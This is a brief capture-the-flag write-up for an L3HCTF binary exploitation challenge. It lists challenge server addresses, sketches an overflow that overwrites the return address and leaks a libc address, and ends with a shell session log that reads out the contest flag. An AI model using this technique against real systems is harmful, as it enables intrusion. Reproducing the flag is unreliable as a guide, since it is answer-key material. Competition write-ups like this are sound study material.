# info
1.95.8.146:9999
1.95.34.119:9999
43.138.2.216:9999

建议本地跑通后再开始攻击。
It’s recommended to get it running locally before you start the attack.

# 思路
- read使buf填满，改变v4的值，可以直接操纵ret的值
- ret的时候，rsi正好是libc地址，直接跳到print，泄漏libc

![](https://r2.20161023.xyz/pic/20250714192724634.png)
![](https://r2.20161023.xyz/pic/20250714192912403.png)


# debug

![](https://r2.20161023.xyz/pic/20250714181706038.png)

0x7fb07de7f643
0x204643

![](https://r2.20161023.xyz/pic/20250714190842164.png)

# getshell
```
[DEBUG] Received 0x2a bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'vul2\n'
bin
dev
flag
lib
lib32
lib64
libexec
vul2
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x1b bytes:
    b'L3HCTF{p0p_rbp_heap_rul3z}\n'
L3HCTF{p0p_rbp_heap_rul3z}

```
![](https://r2.20161023.xyz/pic/20250714192615684.png)